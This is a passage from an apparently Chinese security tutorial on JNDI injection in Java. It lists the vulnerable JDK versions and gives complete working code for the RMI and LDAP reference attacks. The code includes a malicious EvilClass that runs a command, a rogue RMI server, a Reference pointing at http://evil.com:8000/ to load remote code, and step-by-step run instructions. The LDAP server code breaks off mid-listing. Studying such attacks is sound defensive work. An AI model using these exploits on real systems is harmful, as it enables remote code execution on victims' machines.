ctx.bind(&#34;refObj&#34;, new RefObject());

//通过名称查找对象
ctx.lookup(&#34;refObj&#34;);</code></pre><p>LDAP</p>
<pre tabindex="0"><code>Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY,
 &#34;com.sun.jndi.ldap.LdapCtxFactory&#34;);
env.put(Context.PROVIDER_URL, &#34;ldap://localhost:1389&#34;);

DirContext ctx = new InitialDirContext(env);

//通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了
Object local_obj = ctx.lookup(&#34;cn=foo,dc=test,dc=org&#34;);</code></pre><h2 id="jndi注入" class="heading-element"><span>JNDI注入</span>
  <a href="#jndi%e6%b3%a8%e5%85%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>高版本绕过：</p>
<p><a href="https://tttang.com/archive/1405/"target="_blank" rel="external nofollow noopener noreferrer">https://tttang.com/archive/1405/</a></p>
<p><a href="https://tttang.com/archive/1489/"target="_blank" rel="external nofollow noopener noreferrer">https://tttang.com/archive/1489/</a></p>
<p><a href="https://tttang.com/archive/1409/"target="_blank" rel="external nofollow noopener noreferrer">https://tttang.com/archive/1409/</a></p>
<p><strong>JNDI注入</strong>是BlackHat 2016（USA）<a href="https://twitter.com/pwntester"target="_blank" rel="external nofollow noopener noreferrer">@pentester</a>的一个议题&quot;<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"target="_blank" rel="external nofollow noopener noreferrer">A Journey From JNDI LDAP Manipulation To RCE</a>&quot;[9]提出的。提出的时候名字叫“JNDI操纵”，这个按理说更贴合一些，因为这种攻击方式并不是像SQL注入、Xpath注入那样的，说操纵更合适。</p>
<p>jndi注入不同版本利用的方式是不同的，jdk很早就修复了对rmi的利用，但是对ldap的注入一直到jdk8u191(2018年)才修复（高版本仍有绕过方式），它厉害的点在于他是不依赖第三方库的，甚至可以直接执行远程字节码。</p>
<h3 id="jndi攻击向量" class="heading-element"><span>JNDI攻击向量</span>
  <a href="#jndi%e6%94%bb%e5%87%bb%e5%90%91%e9%87%8f" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li>RMI</li>
<li>LDAP</li>
<li>Serialized Object</li>
<li>JNDI Reference</li>
<li>Remote Object（有安全管理器的限制，在上面RMI利用部分也能看到）</li>
<li>Remote Location</li>
<li>CORBA</li>
<li>IOR
这里引用一张经典图片，以更好地说明jdk版本与攻击向量的选择:</li>
</ul>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021618041.webp" alt="image-20240902161833891" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021618041.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021618041.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409021618041.webp?size=large 2x" data-title="image-20240902161833891" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="jndi-referencermi攻击" class="heading-element"><span>JNDI Reference+RMI攻击</span>
  <a href="#jndi-referencermi%e6%94%bb%e5%87%bb" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="限制条件" class="heading-element"><span>限制条件</span>
  <a href="#%e9%99%90%e5%88%b6%e6%9d%a1%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><ul>
<li>JDK 6 &lt;6u132</li>
<li>JDK 7 &lt; 7u122</li>
<li>JDK 8 &lt; 8u113
在这些版本之后，系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为false，即默认不允许RMI、cosnaming从远程的Codebase加载Reference工厂类。</li>
</ul>
<h4 id="攻击流程" class="heading-element"><span>攻击流程</span>
  <a href="#%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>在我们攻击流程中，我们需要使用到Reference类，其有几个比较关键的属性：</p>
<ol>
<li>className - 远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载</li>
<li>classFactory - 远程的工厂类</li>
<li>classFactoryLocation - 工厂类加载的地址，可以是各种协议，如http://</li>
</ol>
<p><strong>参考代码如下:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">Reference</span> <span style="color:#58a1dd">refObj</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Reference</span>(<span style="color:#a6be9d">&#34;refClassName&#34;</span>, <span style="color:#a6be9d">&#34;FactoryClassName&#34;</span>, <span style="color:#a6be9d">&#34;http://evil.com:8000/&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//refClassName为类名加上包名，FactoryClassName为工厂类名并且包含工厂类的包名，http://evil.com:9999/是classFactoryLocation</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ReferenceWrapper</span> <span style="color:#58a1dd">refObjWrapper</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ReferenceWrapper</span>(<span style="color:#58a1dd">refObj</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">registry</span>.<span style="color:#58a1dd">bind</span>(<span style="color:#a6be9d">&#34;refObj&#34;</span>, <span style="color:#58a1dd">refObjWrapper</span>);</span></span></code></pre></div><p><strong>完整代码如下</strong>:</p>
<p>客户端:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.naming.Context</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.naming.InitialContext</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">RMIClient</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Context</span> <span style="color:#58a1dd">ctx</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InitialContext</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ctx</span>.<span style="color:#58a1dd">lookup</span>(<span style="color:#a6be9d">&#34;rmi://127.0.0.1:9999/refObj&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>服务端:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.sun.jndi.rmi.registry.ReferenceWrapper</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.naming.NamingException</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.naming.Reference</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.rmi.AlreadyBoundException</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.rmi.RemoteException</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.rmi.registry.LocateRegistry</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.rmi.registry.Registry</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">RMIServer</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">RemoteException</span>, <span style="color:#58a1dd">NamingException</span>, <span style="color:#58a1dd">AlreadyBoundException</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Registry</span> <span style="color:#58a1dd">registry</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">LocateRegistry</span>.<span style="color:#58a1dd">createRegistry</span>(<span style="color:#58a1dd">9999</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;java RMI registry created. port on 9999...&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Reference</span> <span style="color:#58a1dd">refObj</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Reference</span>(<span style="color:#a6be9d">&#34;ExportObject&#34;</span>, <span style="color:#a6be9d">&#34;EvilClass&#34;</span>, <span style="color:#a6be9d">&#34;http://127.0.0.1:8000/&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ReferenceWrapper</span> <span style="color:#58a1dd">refObjWrapper</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ReferenceWrapper</span>(<span style="color:#58a1dd">refObj</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">registry</span>.<span style="color:#58a1dd">bind</span>(<span style="color:#a6be9d">&#34;refObj&#34;</span>, <span style="color:#58a1dd">refObjWrapper</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>恶意类:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.IOException</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">EvilClass</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">EvilClass</span>() {
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">static</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Runtime</span>.<span style="color:#58a1dd">getRuntime</span>().<span style="color:#58a1dd">exec</span>(<span style="color:#a6be9d">&#34;calc.exe&#34;</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">IOException</span> <span style="color:#58a1dd">var1</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">var1</span>.<span style="color:#58a1dd">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><strong>完整攻击流程</strong>:</p>
<ol>
<li>编译EvilClass.java为EvilClass.class (<code>javac EvilClass.java</code>)</li>
<li>运行恶意http server，挂载上述class(<code>python3 -m http.server 8000</code>)</li>
<li>运行恶意rmi server(上面的RMIServer类)</li>
<li>运行客户端发起请求(上面的RMIClient类)</li>
<li>客户端对恶意RMI server发送请求，获取远程对象存根实例</li>
<li>客户端会先从本地的<code>CLASSPATH</code>中寻找<code>ExportObject</code>，如果找不到，则从classFactoryLocation即<code>http://127.0.0.1:8000/EvilClass.class</code>中寻找工厂类</li>
<li>客户端通过实例化工厂类获取真正的对象，工厂类中包含的恶意代码被执行</li>
</ol>
<h3 id="jndi-referenceldap攻击" class="heading-element"><span>JNDI Reference+LDAP攻击</span>
  <a href="#jndi-referenceldap%e6%94%bb%e5%87%bb" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>这里就不介绍ldap协议了，直接看如何攻击。</p>
<h4 id="限制条件-1" class="heading-element"><span>限制条件</span>
  <a href="#%e9%99%90%e5%88%b6%e6%9d%a1%e4%bb%b6-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><ul>
<li>JDK 6 &lt; 6u211</li>
<li>JDK 7 &lt; 7u201</li>
<li>JDK 8 &lt; 8u191</li>
<li>JDK 11 &lt; 11.0.1
在这些版本之后，<code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的默认值被调整为false，对LDAP Reference远程工厂类的加载增加了限制。</li>
</ul>
<h4 id="攻击流程-1" class="heading-element"><span>攻击流程</span>
  <a href="#%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>攻击流程与上面的JNDI Reference+RMI攻击类似。</p>
<p><strong>完整代码如下</strong>(参考marshalsec项目):</p>
<p>客户端:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.naming.Context</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.naming.InitialContext</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">LDAPClient</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Context</span> <span style="color:#58a1dd">ctx</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InitialContext</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ctx</span>.<span style="color:#58a1dd">lookup</span>(<span style="color:#a6be9d">&#34;ldap://127.0.0.1:7777/anything&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>服务端maven依赖:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">dependency</span><span style="color:#ff636f">&gt;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">groupId</span><span style="color:#ff636f">&gt;</span><span style="color:#58a1dd">com</span>.<span style="color:#58a1dd">unboundid</span><span style="color:#ff636f">&lt;/</span><span style="color:#58a1dd">groupId</span><span style="color:#ff636f">&gt;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">artifactId</span><span style="color:#ff636f">&gt;</span><span style="color:#58a1dd">unboundid</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">ldapsdk</span><span style="color:#ff636f">&lt;/</span><span style="color:#58a1dd">artifactId</span><span style="color:#ff636f">&gt;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">version</span><span style="color:#ff636f">&gt;</span><span style="color:#58a1dd">6</span>.<span style="color:#58a1dd">0</span>.<span style="color:#58a1dd">0</span><span style="color:#ff636f">&lt;/</span><span style="color:#58a1dd">version</span><span style="color:#ff636f">&gt;</span>  
</span></span><span style="display:flex;"><span><span style="color:#ff636f">&lt;/</span><span style="color:#58a1dd">dependency</span><span style="color:#ff636f">&gt;</span></span></span></code></pre></div><p>服务端:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.listener.InMemoryDirectoryServer</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.listener.InMemoryListenerConfig</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.sdk.Entry</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.sdk.LDAPException</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.sdk.LDAPResult</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.sdk.ResultCode</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.net.ServerSocketFactory</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.net.SocketFactory</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.net.ssl.SSLSocketFactory</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.net.InetAddress</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.net.MalformedURLException</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.net.URL</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">LDAPServer</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">final</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">LDAP_BASE</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;dc=example,dc=com&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span> ( <span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">tmp_args</span> ) {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span><span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span>{<span style="color:#a6be9d">&#34;http://127.0.0.1:8000/#EvilClass&#34;</span>};
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">int</span> <span style="color:#58a1dd">port</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">7777</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">InMemoryDirectoryServerConfig</span> <span style="color:#58a1dd">config</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InMemoryDirectoryServerConfig</span>(<span style="color:#58a1dd">LDAP_BASE</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">config</span>.<span style="color:#58a1dd">setListenerConfigs</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">InMemoryListenerConfig</span>(
</span></span><span style="display:flex;"><span>                    <span style="color:#a6be9d">&#34;listen&#34;</span>, <span style="color:#828b96;font-style:italic">//$NON-NLS-1$</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">InetAddress</span>.<span style="color:#58a1dd">getByName</span>(<span style="color:#a6be9d">&#34;0.0.0.0&#34;</span>), <span style="color:#828b96;font-style:italic">//$NON-NLS-1$</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">port</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">ServerSocketFactory</span>.<span style="color:#58a1dd">getDefault</span>(),
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">SocketFactory</span>.<span style="color:#58a1dd">getDefault</span>(),
</span></span><span style="display:flex;"><span>                    (<span style="color:#58a1dd">SSLSocketFactory</span>) <span style="color:#58a1dd">SSLSocketFactory</span>.<span style="color:#58a1dd">getDefault</span>()));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">config</span>.<span style="color:#58a1dd">addInMemoryOperationInterceptor</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">OperationInterceptor</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">URL</span>(<span style="color:#58a1dd">args</span><span style="color:#ff636f">[</span> <span style="color:#58a1dd">0</span> <span style="color:#ff636f">]</span>)));
